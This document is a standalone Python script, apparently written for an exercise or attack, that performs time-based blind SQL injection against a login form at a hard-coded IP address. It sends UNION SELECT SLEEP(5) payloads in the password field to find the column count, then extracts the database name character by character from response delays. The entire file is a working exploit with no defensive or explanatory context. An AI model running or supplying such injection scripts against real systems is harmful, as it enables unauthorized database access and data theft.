import requests
import time

def db_name():
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    a=0
    db = []
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    passwd_type = ""
    global table
    table = ""

    for letter in dictionary:
        for num in range(1, 10):
            usr = "idc"
            nums = ",{}".format(",".join([str(i) for i in range(1, num + 1)]))
            passwd_type = "' UNION SELECT SLEEP(5)" + nums + "" + " where database() like '" + letter + "%' -- "
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd_type})
            end_time = time.time()
            total_time = end_time - start_time
            if total_time >= TIME:
                table = nums
                break
        if total_time >= TIME:
            break
 
 
    print(table)

    for i in range(1, 20):
        for j in range(0, len(dictionary)):         
            usr = "idc"
            passwd = "' UNION SELECT SLEEP(5)" + table + " where database() like '" + texte + dictionary[j] + "%' -- "
            print(passwd)


            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            a += 1
            print(a)



            if a > 27:
                break
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break



    db.append(texte)
    print(db)

db_name()
